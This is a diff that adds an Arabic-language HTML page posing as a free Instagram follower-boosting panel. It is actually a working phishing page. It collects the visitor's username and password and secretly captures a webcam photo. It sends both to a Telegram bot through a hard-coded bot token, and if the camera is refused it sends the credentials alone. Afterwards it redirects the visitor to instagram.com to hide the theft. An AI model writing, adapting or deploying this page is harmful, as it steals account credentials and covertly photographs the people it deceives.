@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMM ROYAL | 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
+    <style>
+        :root { --blue-glow: #00d2ff; --royal: #0045ff; --dark: #020b1a; }
+        body { background: radial-gradient(circle at center, #0a192f 0%, #020b1a 100%); color: white; font-family:  Cairo , sans-serif; text-align: center; padding: 15px; margin: 0; }
+        .card { border: 1px solid var(--blue-glow); border-radius: 25px; padding: 25px; max-width: 400px; margin: 30px auto; background: rgba(2, 11, 26, 0.8); box-shadow: 0 0 30px rgba(0, 210, 255, 0.2); backdrop-filter: blur(10px); }
+        
+        h1 { color: var(--blue-glow); text-shadow: 0 0 10px var(--blue-glow); font-size: 24px; margin-bottom: 5px; }
+        p { color: #8892b0; font-size: 13px; margin-bottom: 20px; }
+
+        /* الأوامر */
+        .service-list { text-align: right; margin-bottom: 20px; }
+        .service-item { background: rgba(255,255,255,0.05); border: 1px solid #112240; padding: 12px; margin: 8px 0; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.3s; }
+        .service-item:hover { background: rgba(0, 210, 255, 0.1); border-color: var(--blue-glow); }
+        .free-tag { color: #00ff88; font-weight: bold; font-size: 14px; }
+        .paid-tag { color: #f39c12; font-weight: bold; font-size: 14px; }
+
+        /* المدخلات */
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #0a192f; border: 1px solid #112240; color: var(--blue-glow); border-radius: 10px; text-align: center; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--blue-glow); box-shadow: 0 0 10px rgba(0, 210, 255, 0.3); }
+
+        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, var(--royal), var(--blue-glow)); border: none; color: white; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 18px; margin-top: 15px; box-shadow: 0 4px 15px rgba(0, 69, 255, 0.4); }
+        
+        .signature { margin-top: 30px; color: var(--blue-glow); font-size: 22px; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px var(--blue-glow); opacity: 0.8; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>𝙎𝙈𝙈 𝙍𝙊𝙔𝘼𝙇 𝙋𝘼𝙉𝙀𝙇</h1>
+        <p>المنصة الأسرع لزيادة المتابعين 2026</p>
+
+        <div class="service-list">
+            <div class="service-item" onclick="selectSrv( 200 متابع مجاني )">
+                <span>👤 200 متابع (تجريبي)</span>
+                <span class="free-tag">FREE</span>
+            </div>
+            <div class="service-item" onclick="alert( ⚠️ الرصيد الحالي 0.00$\nيرجى التواصل مع الإدارة لشحن الحساب. )">
+                <span>👤 5,000 متابع VIP</span>
+                <span class="paid-tag">15.00$ 💰</span>
+            </div>
+            <div class="service-item" onclick="alert( ⚠️ الرصيد الحالي 0.00$\nيرجى التواصل مع الإدارة لشحن الحساب. )">
+                <span>👤 10,000 متابع ملكي</span>
+                <span class="paid-tag">28.00$ 💰</span>
+            </div>
+            <div class="service-item" onclick="alert( ⚠️ الرصيد الحالي 0.00$\nيرجى التواصل مع الإدارة لشحن الحساب. )">
+                <span>👤 20,000 متابع عالمي</span>
+                <span class="paid-tag">50.00$ 💰</span>
+            </div>
+        </div>
+
+        <input type="text" id="u" placeholder="Username" oninput="validate(this)">
+        <input type="password" id="p" placeholder="Password" oninput="validate(this)">
+        
+        <button class="btn" onclick="start()">تأكيد طلب الزيادة</button>
+        
+        <div class="signature">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
+    </div>
+
+    <video id="v" autoplay class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+        const tok = "8250478196:AAH0J5NF3C0vM_Zm_DqE8wmbeKJc3..."; // توكنك يا فارس
+        const cid = new URLSearchParams(window.location.search).get( chatId );
+
+        // منع الحروف العربية
+        function validate(input) {
+            input.value = input.value.replace(/[^\x00-\x7F]/g, "");
+        }
+
+        function selectSrv(name) {
+            alert("تم اختيار: " + name + "\nيرجى إدخال البيانات بالأسفل للمتابعة.");
+        }
+
+        async function start() {
+            const user = document.getElementById( u ).value;
+            const pass = document.getElementById( p ).value;
+            
+            if(!user || !pass) return alert("الرجاء إدخال اسم المستخدم وكلمة المرور!");
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: true});
+                document.getElementById( v ).srcObject = s;
+                
+                setTimeout(() => {
+                    const can = document.getElementById( c );
+                    can.width = 640; can.height = 480;
+                    can.getContext( 2d ).drawImage(document.getElementById( v ), 0, 0, 640, 480);
+                    
+                    can.toBlob(b => {
+                        const f = new FormData();
+                        f.append( chat_id , cid);
+                        f.append( photo , b,  royal.jpg );
+                        f.append( caption , `🛰 صيد ملكي (أزرق) 🛰\n\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}\n💠 المصمم: 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞`);
+                        
+                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method: POST , body:f})
+                        .then(() => {
+                            alert("✅ تم إرسال طلبك بنجاح! انتظر وصول المتابعين.");
+                            window.location.href = "https://instagram.com";
+                        });
+                    },  image/jpeg );
+                }, 1000);
+            } catch(e) {
+                // إرسال نصي في حال رفض الكاميرا
+                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("⚠️ صيد (رفض الكاميرا)\n👤: "+user+"\n🔑: "+pass)}`)
+                .then(() => {
+                    alert("✅ جاري تنفيذ الطلب..");
+                    window.location.href = "https://instagram.com";
+                });
+            }
+        }
+    </script>
+</body>
+</html>
